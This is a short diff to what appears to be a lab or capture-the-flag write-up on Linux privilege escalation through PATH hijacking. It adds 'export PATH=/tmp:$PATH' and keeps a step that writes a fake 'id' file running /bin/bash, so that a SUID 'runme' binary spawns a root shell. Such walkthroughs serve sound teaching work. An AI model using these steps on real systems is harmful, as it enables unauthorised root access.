@@ -96,7 +96,9 @@ Running the command: `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v
 
 ![image](https://user-images.githubusercontent.com/59768512/155546802-a04f101c-dfa8-4cac-bbca-9b85a6fa6184.png)
 
-Adding the writeable folder `/tmp` to the path means that executable files will use programs present in that folder
+Adding the writeable folder `/tmp` to the path means that executable files will use programs present in that folder using the command export PATH=/tmp:$PATH
+
+
 
 Adding a altered `id` file and make it execute `/bin/bash` means that when the `runme` executable file is executed it will run the fabricated id file and spawn a sudo bash shell.
 `echo "/bin/bash" > id`
